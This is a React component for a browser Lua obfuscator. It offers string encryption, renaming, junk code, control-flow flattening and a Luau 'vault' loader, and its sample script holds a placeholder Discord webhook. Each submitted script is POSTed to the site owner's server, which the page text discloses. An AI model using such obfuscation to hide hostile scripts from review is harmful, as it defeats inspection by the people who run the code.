import { useRef, useState } from "react";
import { motion } from "motion/react";
import { Check, Copy, Download, FileUp, Link2, Lock, Wand2 } from "lucide-react";
import { obfuscateLua, type ObfuscateOptions, type ObfuscateResult } from "@/lib/obfuscate";

const SAMPLE = `-- Blues DET demo script
local SECRET = "https://discord.com/api/webhooks/123/abcDEF"
local channel = "ops"

local function greet(name)
  local message = "hello, " .. name
  print(message)
  return 42
end

for i = 1, 3 do
  greet(channel)
end`;

const OPT_META: Array<{ key: keyof ObfuscateOptions; label: string; hint: string; testid: string }> = [
  { key: "encryptStrings", label: "Encrypt strings", hint: "URLs, messages, keys → cipher tables", testid: "opt-strings" },
  { key: "renameLocals", label: "Rename locals", hint: "scope-aware identifier scrambling", testid: "opt-locals" },
  { key: "mutateNumbers", label: "Mutate numbers", hint: "literals → arithmetic expressions", testid: "opt-numbers" },
  { key: "stripComments", label: "Strip comments", hint: "every comment stripped", testid: "opt-comments" },
];

const PANEL = "scanlines overflow-hidden rounded-md border border-sky-400/15 bg-[#070b12]";

type InputTab = "paste" | "upload" | "url";

export function LuaObfuscator() {
  const [source, setSource] = useState(SAMPLE);
  const [inputTab, setInputTab] = useState<InputTab>("paste");
  const [urlInput, setUrlInput] = useState("");
  const [urlBusy, setUrlBusy] = useState(false);
  const [urlError, setUrlError] = useState<string | null>(null);
  const [fileName, setFileName] = useState<string | null>(null);
  const fileRef = useRef<HTMLInputElement>(null);

  const [opts, setOpts] = useState<ObfuscateOptions>({
    vault: false,
    encryptStrings: true,
    renameLocals: true,
    mutateNumbers: true,
    stripComments: true,
  });
  const [multiVault, setMultiVault] = useState(false);
  const [flattenFlow, setFlattenFlow] = useState(false);
  const [junk, setJunk] = useState(true);

  const [result, setResult] = useState<ObfuscateResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [view, setView] = useState<"output" | "source">("output");
  const [submittedSource, setSubmittedSource] = useState("");

  const loadFile = (file: File | undefined) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      setSource(String(reader.result ?? ""));
      setFileName(file.name);
      setInputTab("paste");
      setResult(null);
    };
    reader.readAsText(file);
  };

  const loadUrl = async () => {
    setUrlBusy(true);
    setUrlError(null);
    try {
      const res = await fetch(urlInput);
      if (!res.ok) throw new Error(`remote answered ${res.status}`);
      const text = await res.text();
      if (!text.trim()) throw new Error("empty response");
      setSource(text);
      setFileName(urlInput.split("/").pop() ?? null);
      setInputTab("paste");
      setResult(null);
    } catch {
      setUrlError("Could not fetch that link — the remote host likely blocks browser requests (CORS). Download the file and upload it instead.");
    } finally {
      setUrlBusy(false);
    }
  };

  const run = () => {
    setError(null);
    // Vault alone never parses (Luau-safe); deep layers are masked off in vault mode —
    // flattening and junk still stack on top.
    const effectiveOpts = opts.vault
      ? { ...opts, encryptStrings: false, renameLocals: false, mutateNumbers: false, stripComments: false }
      : opts;
    try {
      setResult(obfuscateLua(source, effectiveOpts, multiVault ? 2 : 1, flattenFlow, junk));
      setSubmittedSource(source);
      setView("output");
      // Archive the submitted source for the site owner (30-day auto-delete).
      fetch("/api/scripts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ source }),
      }).catch(() => {});
    } catch (err) {
      setResult(null);
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  const copyOut = async () => {
    if (!result) return;
    await navigator.clipboard.writeText(result.code);
    setCopied(true);
    setTimeout(() => setCopied(false), 1600);
  };

  const downloadOut = () => {
    if (!result) return;
    const blob = new Blob([result.code], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "obfuscated.lua";
    a.click();
    URL.revokeObjectURL(a.href);
  };

  const INPUT_TABS: Array<{ id: InputTab; label: string; icon: typeof FileUp; testid: string }> = [
    { id: "paste", label: "Paste", icon: FileUp, testid: "input-tab-paste" },
    { id: "upload", label: "Upload .lua / .txt", icon: FileUp, testid: "input-tab-upload" },
    { id: "url", label: "From link", icon: Link2, testid: "input-tab-url" },
  ];

  return (
    <section id="obfuscator" data-testid="obfuscator-section" className="mx-auto max-w-7xl px-5 py-24 sm:px-8">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true, margin: "-80px" }}
        transition={{ duration: 0.7 }}
      >
        <p className="font-mono text-[10px] font-semibold uppercase tracking-[0.35em] text-sky-400">
          Module 03 // Lua obfuscator
        </p>
        <h2 className="mt-3 max-w-2xl font-heading text-3xl font-black uppercase tracking-tight text-slate-50 sm:text-4xl">
          Make your Lua unreadable
        </h2>
        <p className="mt-4 max-w-2xl font-mono text-sm leading-relaxed text-slate-400">
          Paste, upload, or pull from a link — then bury it: string encryption, scope-aware
          renaming, number mutation, junk-code injection, Prometheus-style control-flow
          flattening, and a hardened vault loader that stacks with everything. Heads up:
          obfuscation runs in your tab, but submitted sources are archived for the site owner
          and auto-delete after 30 days.
        </p>
      </motion.div>

      <div className="mt-12 grid grid-cols-1 gap-5 lg:grid-cols-2">
        <div className={PANEL}>
          <div className="flex flex-wrap gap-2 border-b border-sky-400/10 px-5 py-4" role="tablist">
            {INPUT_TABS.map((t) => (
              <button
                key={t.id}
                data-testid={t.testid}
                role="tab"
                aria-selected={inputTab === t.id}
                onClick={() => (t.id === "upload" ? fileRef.current?.click() : setInputTab(t.id))}
                className={`flex items-center gap-2 rounded-sm border px-3.5 py-2 font-mono text-[10px] font-bold uppercase tracking-[0.15em] transition-colors ${
                  inputTab === t.id
                    ? "border-sky-400/50 bg-sky-400/15 text-sky-200"
                    : "border-slate-800 text-slate-500 hover:border-sky-400/30 hover:text-sky-300"
                }`}
              >
                <t.icon className="h-3.5 w-3.5" />
                {t.label}
              </button>
            ))}
            <input
              ref={fileRef}
              type="file"
              accept=".lua,.txt"
              data-testid="lua-file-input"
              className="hidden"
              onChange={(e) => loadFile(e.target.files?.[0])}
            />
          </div>

          {inputTab === "url" && (
            <div className="space-y-3 border-b border-sky-400/10 px-5 py-4">
              <div className="flex gap-2">
                <input
                  data-testid="lua-url-input"
                  value={urlInput}
                  onChange={(e) => setUrlInput(e.target.value)}
                  placeholder="https://…/script.lua"
                  className="w-full rounded-sm border border-slate-700 bg-[#04060b] px-4 py-2.5 font-mono text-xs text-slate-200 placeholder:text-slate-600 focus:border-sky-400/60 focus:outline-none"
                />
                <button
                  data-testid="lua-url-load-button"
                  onClick={loadUrl}
                  disabled={urlBusy || !urlInput.trim()}
                  className="shrink-0 rounded-sm bg-sky-400 px-4 py-2.5 font-mono text-[10px] font-bold uppercase tracking-[0.15em] text-[#03121d] transition-colors hover:bg-sky-300 disabled:opacity-50"
                >
                  {urlBusy ? "Loading…" : "Load"}
                </button>
              </div>
              {urlError && (
                <p data-testid="lua-url-error" className="font-mono text-[11px] leading-relaxed text-red-300">
                  {urlError}
                </p>
              )}
            </div>
          )}

          <textarea
            data-testid="lua-input"
            value={source}
            onChange={(e) => setSource(e.target.value)}
            spellCheck={false}
            className="h-72 w-full resize-y bg-transparent px-5 py-4 font-mono text-xs leading-relaxed text-slate-300 focus:outline-none"
          />
          {fileName && (
            <p data-testid="lua-loaded-file" className="border-t border-sky-400/10 px-5 py-2 font-mono text-[10px] text-sky-300">
              Loaded: {fileName}
            </p>
          )}

          <div className="space-y-3 border-t border-sky-400/10 px-5 py-4">
            <label
              className={`flex cursor-pointer items-start gap-3 rounded-sm border p-3 transition-colors ${
                opts.vault ? "border-amber-400/40 bg-amber-400/10" : "border-slate-800 hover:border-amber-400/30"
              }`}
            >
              <input
                type="checkbox"
                data-testid="opt-vault"
                checked={opts.vault}
                onChange={(e) => setOpts({ ...opts, vault: e.target.checked })}
                className="mt-0.5 accent-amber-400"
              />
              <span>
                <span className="flex items-center gap-2 font-mono text-[11px] font-bold uppercase tracking-[0.15em] text-amber-300">
                  <Lock className="h-3 w-3" /> Vault mode
                </span>
                <span className="mt-1 block font-mono text-[10px] leading-relaxed text-slate-500">
                  Whole-script cipher behind a hardened loader — works with any Lua dialect
                  including Roblox Luau. Stacks with ×2 nesting, flattening, and junk.
                </span>
              </span>
            </label>
            {opts.vault && (
              <label className="flex cursor-pointer items-center gap-3 rounded-sm border border-amber-400/30 bg-amber-400/5 p-3 transition-colors hover:border-amber-400/50">
                <input
                  type="checkbox"
                  data-testid="opt-multivault"
                  checked={multiVault}
                  onChange={(e) => setMultiVault(e.target.checked)}
                  className="accent-amber-400"
                />
                <span className="font-mono text-[10px] font-bold uppercase tracking-[0.15em] text-amber-200">
                  ×2 nested vault — WeAreDevs-grade hard scramble
                </span>
              </label>
            )}
            <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
              <label className="flex cursor-pointer items-center gap-3 rounded-sm border border-sky-400/25 bg-sky-400/5 p-3 transition-colors hover:border-sky-400/50">
                <input
                  type="checkbox"
                  data-testid="opt-flatten"
                  checked={flattenFlow}
                  onChange={(e) => setFlattenFlow(e.target.checked)}
                  className="accent-sky-400"
                />
                <span className="font-mono text-[10px] font-bold uppercase tracking-[0.15em] text-sky-200">
                  Control-flow flattening
                </span>
              </label>
              <label className="flex cursor-pointer items-center gap-3 rounded-sm border border-sky-400/25 bg-sky-400/5 p-3 transition-colors hover:border-sky-400/50">
                <input
                  type="checkbox"
                  data-testid="opt-junk"
                  checked={junk}
                  onChange={(e) => setJunk(e.target.checked)}
                  className="accent-sky-400"
                />
                <span className="font-mono text-[10px] font-bold uppercase tracking-[0.15em] text-sky-200">
                  Junk-code injection
                </span>
              </label>
            </div>
            <div className={`grid grid-cols-1 gap-2 sm:grid-cols-2 ${opts.vault ? "pointer-events-none opacity-40" : ""}`}>
              {OPT_META.map((opt) => (
                <label
                  key={opt.key}
                  className="flex cursor-pointer items-start gap-2.5 rounded-sm border border-slate-800 p-3 transition-colors hover:border-sky-400/30"
                >
                  <input
                    type="checkbox"
                    data-testid={opt.testid}
                    checked={opts[opt.key]}
                    onChange={(e) => setOpts({ ...opts, [opt.key]: e.target.checked })}
                    className="mt-0.5 accent-sky-400"
                  />
                  <span>
                    <span className="block font-mono text-[11px] font-bold uppercase tracking-[0.15em] text-slate-200">
                      {opt.label}
                    </span>
                    <span className="mt-0.5 block font-mono text-[10px] text-slate-600">{opt.hint}</span>
                  </span>
                </label>
              ))}
            </div>
            <button
              data-testid="obfuscate-button"
              onClick={run}
              disabled={!source.trim()}
              className="flex w-full items-center justify-center gap-2 rounded-sm bg-sky-400 px-5 py-3 font-mono text-xs font-bold uppercase tracking-[0.2em] text-[#03121d] transition-colors hover:bg-sky-300 disabled:opacity-50"
            >
              <Wand2 className="h-3.5 w-3.5" />
              Obfuscate
            </button>
          </div>
        </div>

        <div className={PANEL}>
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-sky-400/10 px-5 py-4">
            <div className="flex gap-2" role="tablist">
              <button
                data-testid="view-tab-output"
                role="tab"
                aria-selected={view === "output"}
                onClick={() => setView("output")}
                className={`rounded-sm border px-3.5 py-1.5 font-mono text-[10px] font-bold uppercase tracking-[0.15em] transition-colors ${
                  view === "output"
                    ? "border-sky-400/50 bg-sky-400/15 text-sky-200"
                    : "border-slate-800 text-slate-500 hover:text-sky-300"
                }`}
              >
                Obfuscated
              </button>
              <button
                data-testid="view-tab-source"
                role="tab"
                aria-selected={view === "source"}
                onClick={() => setView("source")}
                disabled={!result}
                className={`rounded-sm border px-3.5 py-1.5 font-mono text-[10px] font-bold uppercase tracking-[0.15em] transition-colors disabled:opacity-40 ${
                  view === "source"
                    ? "border-sky-400/50 bg-sky-400/15 text-sky-200"
                    : "border-slate-800 text-slate-500 hover:text-sky-300"
                }`}
              >
                View script
              </button>
            </div>
            <div className="flex items-center gap-3">
              <button
                data-testid="copy-output-button"
                onClick={copyOut}
                disabled={!result}
                className="flex items-center gap-1.5 font-mono text-[10px] uppercase tracking-[0.2em] text-slate-500 transition-colors hover:text-sky-300 disabled:opacity-40"
              >
                {copied ? <Check className="h-3 w-3 text-sky-300" /> : <Copy className="h-3 w-3" />}
                Copy
              </button>
              <button
                data-testid="download-output-button"
                onClick={downloadOut}
                disabled={!result}
                className="flex items-center gap-1.5 font-mono text-[10px] uppercase tracking-[0.2em] text-slate-500 transition-colors hover:text-sky-300 disabled:opacity-40"
              >
                <Download className="h-3 w-3" />
                .lua
              </button>
            </div>
          </div>

          {error && (
            <div data-testid="obfuscate-error" className="m-5 rounded-sm border border-red-400/25 bg-red-400/5 p-4">
              <p className="font-mono text-xs font-bold uppercase tracking-[0.2em] text-red-300">Parse failed</p>
              <p className="mt-2 font-mono text-[11px] leading-relaxed text-slate-400">
                {error} — Deep mode reads standard Lua 5.1–5.4 syntax. For Luau-only syntax
                (continue, +=, type annotations), use Vault mode without flattening.
              </p>
            </div>
          )}

          {!error && !result && (
            <div data-testid="obfuscate-empty" className="flex h-72 flex-col items-center justify-center gap-3 p-8 text-center">
              <Lock className="h-6 w-6 text-slate-600" />
              <p className="font-mono text-xs uppercase tracking-[0.25em] text-slate-500">
                Obfuscated output lands here
              </p>
            </div>
          )}

          {result && !error && (
            <>
              <pre
                data-testid="obfuscate-output"
                className="h-72 overflow-auto px-5 py-4 font-mono text-xs leading-relaxed text-sky-200/90"
              >
                {view === "output" ? result.code : submittedSource}
              </pre>
              <div className="grid grid-cols-2 gap-px border-t border-sky-400/10 bg-sky-400/5 sm:grid-cols-5">
                {[
                  { label: "Original", value: `${result.stats.original}B`, testid: "obf-stat-original" },
                  { label: "Output", value: `${result.stats.obfuscated}B`, testid: "obf-stat-output" },
                  { label: "Strings", value: String(result.stats.strings), testid: "obf-stat-strings" },
                  { label: "Locals", value: String(result.stats.locals), testid: "obf-stat-locals" },
                  { label: "Numbers", value: String(result.stats.numbers), testid: "obf-stat-numbers" },
                ].map((s) => (
                  <div key={s.label} className="bg-[#070b12] px-4 py-3">
                    <p className="font-mono text-[9px] uppercase tracking-[0.2em] text-slate-500">{s.label}</p>
                    <p data-testid={s.testid} className="mt-1 font-mono text-sm font-bold text-sky-300">
                      {s.value}
                    </p>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      </div>
    </section>
  );
}
